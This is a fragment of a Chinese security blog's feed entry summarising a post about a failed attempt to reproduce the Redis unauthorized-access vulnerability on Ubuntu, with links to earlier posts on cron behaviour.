      &lt;h1 id=&quot;记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现&quot;&gt;&lt;a href=&quot;#记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现&quot;&gt;&lt;/a&gt;记一次失败漏洞利用的经历–ubuntu下的redis未授权访问漏洞复现&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;由于redis的配置不当导致攻击者可以利用该未授权访问漏洞去对服务器进行攻击，redis服务默认端口为6379端口，在利用该漏洞的时候，由于服务器是ubuntu的原因，遇到了不少坑导致最终并没有利用成功，不像之前在centos环境下利用该漏洞时那样顺利，所以在这里记录一下。在理解这篇文章之前，可以先参考一下之前的&lt;a href=&quot;http://lawlietweb.com/2018/08/17/2018-08-17/#more&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;解决ubuntu任务计划写shell失败的问题&lt;/a&gt;和&lt;a href=&quot;http://lawlietweb.com/2018/08/18/2018-08-18/#more&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;关于ubuntu和centos cron的一些区别&lt;/a&gt;这两篇文章&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
</feed>
